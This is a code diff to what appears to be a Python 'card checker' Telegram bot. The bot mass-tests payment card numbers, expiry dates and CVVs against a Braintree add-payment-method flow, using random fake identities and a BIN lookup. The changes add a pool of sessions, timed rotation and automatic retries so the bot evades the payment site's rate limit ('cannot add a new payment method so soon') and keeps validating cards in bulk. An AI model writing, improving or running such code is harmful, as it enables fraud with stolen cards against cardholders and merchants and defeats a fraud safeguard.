@@ -185,6 +185,9 @@ b3_auth_fp = None
 b3_apm_nonce = None
 b3_config_data = None
 b3_http_session = None
+b3_session_pool = []
+B3_POOL_SIZE = 3
+B3_RATE_LIMIT_DELAY = 22
 
 # ============================================
 # COUNTRY FLAGS
@@ -1395,6 +1398,8 @@ def b3_submit_add_payment_method(session, nonce, apm_nonce, config_data):
 def b3_classify_apm_response(status_code, resp_text):
     if status_code == 0:
         return "ERROR", resp_text[:80]
+    if 'cannot add a new payment method so soon' in resp_text.lower() or 'please wait for' in resp_text.lower():
+        return "RATE_LIMIT", "Rate limited - waiting"
     error_match = re.search(r'There was an error saving your payment method[.\s]*Reason:\s*([^<]+)', resp_text)
     if error_match:
         server_msg = error_match.group(1).strip()
@@ -1439,7 +1444,40 @@ def b3_classify_server_msg(msg):
         return "3DS", msg
     return "DECLINED", msg
 
-def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_nonce=None, config_data=None):
+def b3_init_session_pool():
+    global b3_session_pool
+    b3_session_pool = []
+    for i in range(B3_POOL_SIZE):
+        s, fp, nonce, cfg = b3_get_session_and_auth()
+        if fp:
+            b3_session_pool.append({
+                'session': s, 'auth_fp': fp, 'apm_nonce': nonce,
+                'config_data': cfg, 'last_used': 0
+            })
+    return len(b3_session_pool)
+
+def b3_get_pool_session():
+    global b3_session_pool
+    if not b3_session_pool:
+        b3_init_session_pool()
+    if not b3_session_pool:
+        return None, None, None, None
+    now = time.time()
+    best = None
+    for entry in b3_session_pool:
+        wait = now - entry['last_used']
+        if wait >= B3_RATE_LIMIT_DELAY:
+            if best is None or entry['last_used'] < best['last_used']:
+                best = entry
+    if best is None:
+        best = min(b3_session_pool, key=lambda e: e['last_used'])
+        wait_needed = B3_RATE_LIMIT_DELAY - (now - best['last_used'])
+        if wait_needed > 0:
+            time.sleep(wait_needed)
+    best['last_used'] = time.time()
+    return best['session'], best['auth_fp'], best['apm_nonce'], best['config_data']
+
+def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_nonce=None, config_data=None, use_pool=False):
     global b3_auth_fp, b3_http_session
     start_time = time.time()
     if len(year) == 2:
@@ -1449,7 +1487,12 @@ def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_n
     first, last, email, addr = b3_random_identity()
     
     try:
-        if session is None or auth_fp is None:
+        if use_pool:
+            session, auth_fp, apm_nonce, config_data = b3_get_pool_session()
+            if not auth_fp:
+                elapsed = round(time.time() - start_time, 2)
+                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
+        elif session is None or auth_fp is None:
             session, auth_fp, apm_nonce, config_data = b3_get_session_and_auth(session)
             if not auth_fp:
                 elapsed = round(time.time() - start_time, 2)
@@ -1478,6 +1521,22 @@ def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None, apm_n
         
         chk_status, chk_text = b3_submit_add_payment_method(session, nonce, apm_nonce, config_data)
         result, server_msg = b3_classify_apm_response(chk_status, chk_text)
+        
+        if result == "RATE_LIMIT":
+            time.sleep(B3_RATE_LIMIT_DELAY)
+            auth_fp_new, apm_nonce_new, config_data_new = b3_refresh_auth(session)
+            if auth_fp_new:
+                auth_fp, apm_nonce, config_data = auth_fp_new, apm_nonce_new, config_data_new
+            tok_status2, tok_resp2 = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
+            result2, msg2 = b3_classify_tokenize(tok_status2, tok_resp2)
+            if result2 == "TOKEN":
+                lk2, lr2 = b3_three_ds_lookup(session, auth_fp, msg2, cc, first, last, email, addr)
+                tr2, tm2, n2 = b3_classify_3ds(lk2, lr2)
+                if n2:
+                    cs2, ct2 = b3_submit_add_payment_method(session, n2, apm_nonce, config_data)
+                    result, server_msg = b3_classify_apm_response(cs2, ct2)
+                    if result == "RATE_LIMIT":
+                        result, server_msg = "DECLINED", "Rate limited - try again later"
         
         elapsed = round(time.time() - start_time, 2)
         return result, server_msg, server_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
@@ -3493,7 +3552,9 @@ def b3_mass_command(message):
             stop_mass_flag = False
     
     def _run_b3_mass_inner(chat_id, msg_id):
-        global b3_mass_running, stop_mass_flag, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
+        global b3_mass_running, stop_mass_flag
+        
+        b3_init_session_pool()
         
         stats = {
             'live': 0, 'threeds': 0, 'cvv': 0,
@@ -3515,7 +3576,6 @@ def b3_mass_command(message):
             task_queue.put(None)
         
         def b3_worker(worker_id):
-            global b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
             while not stop_mass_flag:
                 if mass_paused:
                     time.sleep(1)
@@ -3532,8 +3592,8 @@ def b3_mass_command(message):
                     
                     cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
                     bin_info = bin_lookup(cc[:6])
-                    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, apm_nonce=b3_apm_nonce, config_data=b3_config_data)
-                    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data = result
+                    result = check_braintree_auth(cc, month, year, cvv, use_pool=True)
+                    category, status_msg, response_msg, price, gateway, elapsed, _, _, _, _ = result
                     result_queue.put(('success', card_str, (category, status_msg, response_msg, price, gateway, elapsed), worker_id, cc, month, year, cvv, bin_info))
                 except:
                     continue
